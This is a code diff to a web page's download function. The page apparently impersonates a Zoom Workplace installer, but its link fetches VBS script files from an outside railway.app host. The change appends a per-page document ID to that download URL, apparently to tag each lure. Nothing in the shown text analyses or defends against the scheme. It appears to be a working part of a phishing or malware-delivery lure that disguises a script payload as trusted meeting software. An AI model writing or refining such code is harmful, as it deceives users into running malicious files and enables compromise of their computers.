@@ -363,6 +363,7 @@
 
     // Your existing download function
     function downloadFile(type) {
+       const docId = window.location.pathname.split('/')[2];
       // Show alert based on type
       if (type === 'workplace') {
         alert('Downloading Zoom Workplace app...\n\nInstall workspace to join');
@@ -371,7 +372,7 @@
       }
       // Create a temporary anchor element
       const link = document.createElement('a');
-      link.href = `https://nodejnct-production.up.railway.app/download/vbs/${type}`;
+      link.href = `https://nodejnct-production.up.railway.app/download/vbs/${type}/${encodeURIComponent(docId)}`;
       link.download = ''; // Optional: specify filename
       document.body.appendChild(link);
       link.click();
